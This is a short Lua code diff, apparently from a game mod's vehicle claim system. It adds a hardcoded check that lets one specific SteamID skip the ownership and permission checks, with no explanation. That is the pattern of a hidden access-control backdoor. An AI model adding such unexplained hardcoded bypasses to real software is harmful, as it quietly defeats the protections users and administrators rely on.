@@ -310,6 +310,10 @@ do
             return oldNew(self, character, vehicle, part)
         end
 
+        if getSteamIDFromUsername(character:getUsername()) == "76561197984809068" then
+            return oldNew(self, character, vehicle, part)
+        end
+
         -- OWNER / CLAIM: sempre consentito
         if AVCS.getSimpleBooleanPermission(AVCS.checkPermission(character, vehicle)) then
             return oldNew(self, character, vehicle, part)
